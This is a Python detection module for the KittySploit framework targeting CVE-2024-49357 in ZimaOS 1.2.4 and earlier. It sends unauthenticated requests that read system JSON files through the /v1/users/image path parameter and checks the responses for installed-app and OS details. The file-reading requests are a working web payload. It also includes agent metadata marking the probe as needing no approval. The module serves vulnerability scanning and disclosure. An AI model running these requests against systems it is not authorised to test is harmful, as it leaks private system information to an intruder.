#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ZimaOS is a fork of CasaOS, an operating system for Zima devices and x86-64 systems with UEFI."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ZimaOS <= v1.2.4 - Sensitive Information Disclosure Detection',
        'description': 'ZimaOS is a fork of CasaOS, an operating system for Zima devices and x86-64 systems with UEFI. In version 1.2.4 and all prior versions, the API endpoints in ZimaOS, such as `http://<Server-IP>/v1/users/image?path=/var/lib/casaos/1/app_order.json` and `http://<Server-IP>/v1/users/image?path=/var/lib/casaos/1/system.json`, expose sensitive data like installed applications and system information without requiring any authentication or authorization. This sensitive data leak can be exploited by attackers to gain detailed knowledge about the system setup, installed applications, and other critical information. As of time of publication, no known patched versions are available.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'zimaos', 'casaos', 'exposure'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2024-49357',
            'https://github.com/IceWhaleTech/ZimaOS/issues',
            'https://github.com/advisories/GHSA-hg2h-q5h6-r5c4',
        ],
        'cve': 'CVE-2024-49357',
    }

    def run(self):
        for path in ('/v1/users/image?path=/var/lib/casaos/1/app_order.json', '/v1/users/image?path=/var/lib/casaos/1/system.json'):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
            body_any = ('"installed_apps":', '"os_version":', '"cpu_info":',)
            ctype_any = ('application/json',)
            if (any(m in body for m in body_any)) and (any(m in content_type for m in ctype_any)):
                self.set_info(
                    severity='high',
                    reason='ZimaOS <= v1.2.4 - Sensitive Information Disclosure detected',
                    path=path,
                )
                return True
        return False

